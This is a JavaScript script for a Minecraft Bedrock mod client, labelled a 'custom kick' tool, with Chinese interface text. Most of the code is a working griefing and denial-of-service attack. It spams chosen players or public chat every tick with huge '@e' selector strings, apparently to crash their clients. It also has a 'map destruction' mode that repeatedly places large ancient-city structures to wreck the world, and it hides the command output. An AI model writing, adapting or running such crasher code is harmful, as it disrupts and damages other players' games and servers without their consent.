var target = "" // 目标
var random_string = true // 随机字符串
var speed = 1 // 速度[大于1整数=>翻倍  小于1小数=>减慢]
var anti_crasher = true // 拦截命令提示
var crasher_mode = 0 // 崩溃模式
var exist = true // 排除自己
var msg_type = 1 // 消息类型

var pub = false // 公屏模式

var mode_1 = true // 加粗
var mode_2 = false // 斜体
var mode_3 = false // 混乱

var boolean = false // 开关

var timer_1 = 0 // 计时器
var timer_2 = 0 // 计时器

var Info = 0 // 计数

const player_name_list = getPlayerNameList()

const msg = ["§e@e @e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e", "§e"]

clientMessage("§b[DianaGod UI-GB]§eCode By XxxGBRCxxX")
clientMessage("§b[DianaGod UI-GB]§e输入退出脚本即可退出")
settings()

    function settings() {
        const menu = ` {
            "type": "custom_form",
            "title": "自定义踢人",
            "content": [{
                "type": "toggle",
                "text": "随机字符串",
                "default": ` + random_string + `
            }, {
                "type": "toggle",
                "text": "加粗",
                "default": ` + mode_1 + `
            }, {
                "type": "toggle",
                "text": "斜体",
                "default": ` + mode_2 + `
            }, {
                "type": "toggle",
                "text": "混乱",
                "default": ` + mode_3 + `
            }, {
                "type": "dropdown",
                "text": "选择目标",
                "options": ` + JSON.stringify(player_name_list) + `
            }, {
                "type": "toggle",
                "text": "选择全体排除自己",
                "default": ` + exist + `
            }, {
                "type": "input",
                "text": "速度[大于1整数 或 小于1小数]",
                "default": "` + speed + `"
            }, {
                "type": "toggle",
                "text": "拦截消息",
                "default": ` + anti_crasher + `
            }, {
                "type": "step_slider",
                "text": "模式",
                "steps": ["黑名单模式", "单次模式", "毁图模式"],
                "default": ` + crasher_mode + `
            }, {
                "type": "step_slider",
                "text": "消息类型",
                "steps": ["@e", ""],
                "default": ` + msg_type + `
            }]
        }`;

        addForm(menu, function(r, m1, m2, m3, t, e, s, a, m, mt) {
            mode_1 = m1
            mode_2 = m2
            mode_3 = m3
            msg_type = mt
            switch (t) {
                case (t == 0):
                    if (e) {
                        target = "@a[name=!\"" + getEntityName(getLocalPlayerUniqueID()) + "\"]"
                    } else {
                        target = "@a"
                    }
                    break
                case (t == 1):
                    pub = true
                    break
                default:
                    target = player_name_list[t - 1]
            }
            clientMessage("§b[LolitaJK UI-GB]§e选择目标 => " + target)
            random_string = r
            speed = s
            anti_crasher = a
            crasher_mode = m
            if (crasher_mode !== 2) {
                executeCommand("/tell " + target + " §eDianaGodUI")
            }
        })
    }

    function get_mode(mode_1, mode_2, mode_3) {
        var ms = ""
        if (mode_1) {
            ms += "§l"
        } else if (mode_2) {
            ms += "§o"
        } else if (mode_3) {
            ms += "§k"
        }
        return ms
    }

    function getPlayerNameList() {
        const list = getWorldPlayerList()
        var output = ["全部玩家", "公屏轰炸"]
        for (i in list) {
            output.push(list[i].name)
        }
        return output
    }

    function spawn_string(bool, length) {
        if (bool) {
            var output = ""
            for (i = 0; i < length; i++) {
                switch (Math.round(Math.random())) {
                    case 0:
                        output += "O";
                    case 1:
                        output += "o"
                }
            }
            return output
        } else {
            return ""
        }
    }

    function onTickEvent() {
        if (crasher_mode == 2) {
            executeCommand('/placeneteaselargefeature "minecraft:ancient_city/city_center" ~~2~ 0 0_degrees 7')
            showTipMessage("§b[LolitaJK UI-GB]§e当前已发送" + Info + "条消息")
        } else {
            if (boolean && target !== "") {
                if (speed.length > 0 && speed.length < 3) {
                    for (i = 0; i < Number(speed); i++) {
                        if (pub) {
                            sendchatMessage(get_mode(mode_1, mode_2, mode_3) + msg[msg_type] + spawn_string(random_string, 6))
                        } else {
                            executeCommand("/tell " + target + " " + get_mode(mode_1, mode_2, mode_3) + msg[msg_type] + spawn_string(random_string, 6))
                        }
                        Info++
                    }
                } else if (speed.length >= 3) {
                    timer_1 = Date.now()
                    if (Date.now() > 0) {
                        if (timer_1 > timer_2) {
                            if (pub) {
                                sendchatMessage(get_mode(mode_1, mode_2, mode_3) + msg[msg_type] + spawn_string(random_string, 6))
                            } else {
                                executeCommand("/tell " + target + " " + get_mode(mode_1, mode_2, mode_3) + msg[msg_type] + spawn_string(random_string, 6))
                            }
                            Info++;
                            timer_2 = timer_1 + (1000 - Number(speed) * 1000)
                        }
                    }
                    if (Date.now() < 0) {
                        if (timer_1 < timer_2) {
                            if (pub) {
                                sendchatMessage(get_mode(mode_1, mode_2, mode_3) + msg[msg_type] + spawn_string(random_string, 6))
                            } else {
                                executeCommand("/tell " + target + " " + get_mode(mode_1, mode_2, mode_3) + msg[msg_type] + spawn_string(random_string, 6))
                            }
                            Info++;
                            timer_2 = timer_1 + (1000 - Number(speed) * 1000)
                        }
                    }
                }
            }
            showTipMessage("§b[LolitaJK UI-GB]§e当前已发送" + Info + "条消息")
        }
    }

    function onSendChatMessageEvent(message) {
        if (message == '退出脚本') {
            clientMessage('§b[DianaGod UI-GB] §e脚本已关闭')
            exit()
            return true;
        }
        if (message == '设置') {
            settings()
            return true;
        }
    }

    function onCommandOutputEvent(type, args, value) {
        if (crasher_mode !== 2) {
            if (value == 0) {
                if (boolean) {
                    showTipMessage("§b[LolitaJK UI-GB]§e该玩家已退出游戏")
                    clientMessage("§b[LolitaJK UI-GB]§e该玩家已退出游戏")
                } else {
                    showTipMessage("§b[LolitaJK UI-GB]§e未找到玩家")
                    clientMessage("§b[LolitaJK UI-GB]§e未找到玩家")
                }
                if (crasher_mode == "0") {
                    target = ""
                }
            }
            if (value == 1) {
                boolean = true
            }
        }
        if ((anti_crasher && value == 1) || crasher_mode == 2) {
            return true
        }
    }